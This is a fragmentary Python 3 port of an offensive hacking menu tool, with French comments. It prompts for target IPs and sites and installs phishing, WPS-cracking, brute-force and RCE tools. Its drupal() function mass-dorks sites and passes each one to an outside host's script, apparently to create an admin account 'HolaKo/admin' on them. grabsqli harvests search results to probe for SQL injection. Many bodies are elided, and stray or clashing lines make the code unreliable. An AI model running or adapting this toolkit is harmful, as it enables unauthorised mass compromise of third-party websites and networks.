...
import socket
import urllib.parse as urlparse  # Modification pour urllib.parse
from random import choice
import queue as Queue  # Modification pour queue
from getpass import getpass
from subprocess import getstatusoutput as commands
from platform import system
from urllib.parse import urlparse  # Modification pour urllib.parse
...
my_var = None
print(f"My variable is: {my_var or 'None'}")
...
def droidhunter():
    ...
    print("Do You Want to Install Droid-Hunter?")
    choicedh = input("Y/N: ")
    if choicedh in yes:
...
def brutex():
    ...
    clearScr()  # Correction : Clear the screen
    brutexchoice = input("Select a Target : ")  # Correction : Use input() for Python 3
...
def arachni():
    ...
    cara = input("Install And Run ? Y / N : ")  # Correction : Use input() for Python 3
    clearScr()  # Correction : Clear the screen
    print("exemple : http://www.target.com/")
    tara = input("Select a target to scan : ")  # Correction : Use input() for Python 3
    if cara in yes:
...
def xsstracer():
    ...
    clearScr()  # Correction : Clear the screen
    xsstracerchoice = input("Select a Target: ")  # Correction : Use input() for Python 3
...
def weeman():
    ...
    choicewee = input("Install Weeman ? Y / N : ")  # Correction : Use input() for Python 3
    if choicewee in yes:
...
def gabriel():
    ...
    ftpbypass = input("Enter Target IP and Use Command :")  # Correction : Utiliser input() pour Python 3
...
def h2ip():
    host = input("Select A Host : ")  # Correction : Utiliser input() pour Python 3
...
def ports():
    clearScr()
    target = input('Select a Target IP :')  # Correction : Utiliser input() pour Python 3
...
def ifinurl():
    ...
    cinurl = input("Y/N: ")  # Correction : Utiliser input() pour Python 3
    if cinurl in yes:
        inurl()
    if cinurl in no:
        menu()
...
def bsqlbf():
    ...
    cbsq = input("select target : ")  # Correction : Utiliser input() pour Python 3
...
def venom():
    ...
    choiceshell = input("Y/N: ")  # Correction : Utiliser input() pour Python 3
...
def commix():
    ...
    choicecmx = input("Continue: y/n :")  # Correction : Utiliser input() pour Python 3
    if choicecmx in yes:
...
def pixiewps():
    ...
    choicewps = input("Continue ? Y/N : ")  # Correction : Utiliser input() pour Python 3
    if choicewps in yes:
        os.system("git clone https://github.com/wiire/pixiewps.git") 
        os.system("cd pixiewps/src && make ")  # Correction : Utiliser && pour séparer les commandes
        os.system("cd pixiewps/src && sudo make install")  # Correction : Utiliser && pour séparer les commandes
    if choicewps in no: 
        menu() 
    elif choicewps == "":
        menu()
...
def webhack():
    ...
    print("99: Go Back")
    choiceweb = input("Enter Your Choice : ")  # Correction : Utiliser input() pour Python 3
    if choiceweb == "1":
        clearScr()
        maine()
    if choiceweb == "2":
...
def joomlarce():
    ...
    jmtarget = input("Select a targets list :")  # Correction : Utiliser input() pour Python 3
    os.system("python temp.py %s" % jmtarget)
    

def inurl():
    dork = input("select a Dork:")  # Correction : Utiliser input() pour Python 3
    output = input("select a file to save :")  # Correction : Utiliser input() pour Python 3
    os.system("./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
    cinurl = input("Continue ? Y/N : ")  # Correction : Utiliser input() pour Python 3
    if cinurl in no:
        insinurl()
    elif cinurl == "":
        menu()
...
def dtect():
    ...
    cdtect = input("Continue ? Y/N : ")  # Correction : Utiliser input() pour Python 3
    if cdtect in yes:
...
def nmap():
    choice7 = input("continue ? Y / N : ")  # Correction : Utiliser input() pour Python 3
    if choice7 in yes:
        os.system("wget https://nmap.org/dist/nmap-7.01.tar.bz2")
        os.system("bzip2 -cd nmap-7.01.tar.bz2 | tar xvf -")
        os.system("cd nmap-7.01 && ./configure")  # Correction : Utiliser && pour séparer les commandes
        os.system("cd nmap-7.01 && make")  # Correction : Utiliser && pour séparer les commandes
        os.system("su root")
        os.system("cd nmap-7.01 && make install")  # Correction : Utiliser && pour séparer les commandes
    elif choice7 in no:
        info()
    elif choice7 == "":
        menu()
...
def jboss():
    ...
    print("Continue: y/n")
    choice9 = input("yes / no :")  # Correction : Utiliser input() pour Python 3
    if choice9 in yes:
...
def wppluginscan():
    ...
    sitesfile = input("sites file : ")  # Utiliser input() pour Python 3
    filepath = input("Plugins File : ")  # Utiliser input() pour Python 3

    def scan(site, dir):  # Correction de la syntaxe des paramètres
        global resp
        try:
            conn = http.client.HTTPConnection(site)  # Remplacer httplib.HTTPConnection par http.client.HTTPConnection
...
import http.client  # Remplacer httplib par http.client en Python 3
import time

def main(sitesfile, filepath):  # Ajoutez les arguments sitesfile et filepath
    Notfound = [404, 401, 400, 403, 406, 301]
...
def scan(site, dir):  # Ajoutez la définition de la fonction scan
    global resp
    try:
        conn = http.client.HTTPConnection(site)  # Remplacer httplib.HTTPConnection par http.client.HTTPConnection
        conn.request('HEAD', "/wp-content/plugins/" + dir)
...
def grabuploadedlink(url, directories):
    upload = []
    try:
...
directories = ["uploads/", "images/", "data/"]
upload_directories = grabuploadedlink(url, directories)
print("Uploaded directories:", upload_directories)
...
def shelltarget():
    ...
    line = input("target : ")  # Utiliser input() pour Python 3
    line = line.rstrip()
...
def poet():
    ...
    print("")
    choicepoet = input("y / n :")  # Utiliser input() pour Python 3
...
def setoolkit():
    ...
    print("")
    choiceset = input("y / n :")  # Utiliser input() pour Python 3
    if choiceset in yes:
...
def cupp():
    ...
    choicecupp = input("Continue: y/n : ")  # Utiliser input() pour Python 3
...
def ncrack():
    ...
    print("Continue: y/n")
    choicencrack = input("y / n :")  # Utiliser input() pour Python 3
...
def reaver():
    print("""
      ...
      1 to accept / 0 to decline
        """)
    creaver = input("y / n :")  # Utiliser input() pour Python 3
    if creaver in yes:
        ...
        os.system("cd reaver-wps-fork-t6x/src/ && ./configure")  # Utiliser && au lieu de &
        os.system("cd reaver-wps-fork-t6x/src/ && make")  # Utiliser && au lieu de &
    elif creaver in no:
        clearScr()
        wire()
    elif creaver == "":
...
def ssls():
    ...
    cssl = input("y / n :")  # Utiliser input() pour Python 3
    if cssl in yes: 
...
def passwd():
    ...
    choice3 = input("Select from the menu:")
    if choice3 == "1":
        clearScr()
        cupp()
    elif choice3 == "2":
...
def liffy():
    ...
    commandlfi = input("Enter Liffy Command: ")
...
def blackbox():
    ...
    blackboxmodule = input("Choose A Module: ")
...
def snif():
    ...
    print("4 : SMTP Mailer")
    print("99: Back To Main Menu")
    choice6 = input("Select from the menu:")
    if choice6 =="1":
     clearScr(); setoolkit()
    if choice6 =="2":
        clearScr(); ssls()
...
def drupal():
    ...
    while page <= 50:
        ...
        opreq = urllib.request.urlopen(req).read().decode('utf-8')
        ...
        for url in findurl:
            try:
                ...
                resp = urllib.request.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit').read().decode('utf-8')
                
                if "User : HolaKo" in resp:
                    print("Exploit found =>", site)
                    print("user:HolaKo\npass:admin")
                    with open('up.txt', 'a') as a:
                        a.write(site + '\n')
                        a.write("user: HolaKo\npass: admin\n")
                else:
...
def grabsqli(ip):
    try:
        ...
        while page <= 21:
            ...
            readbing = openbing.read().decode('utf-8')
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            sites = findwebs
            for i in sites:
                try:
                    response = urllib.request.urlopen(i).read().decode('utf-8')
                    checksqli(i)
                except urllib.error.HTTPError as e:
                    sites.remove(i)
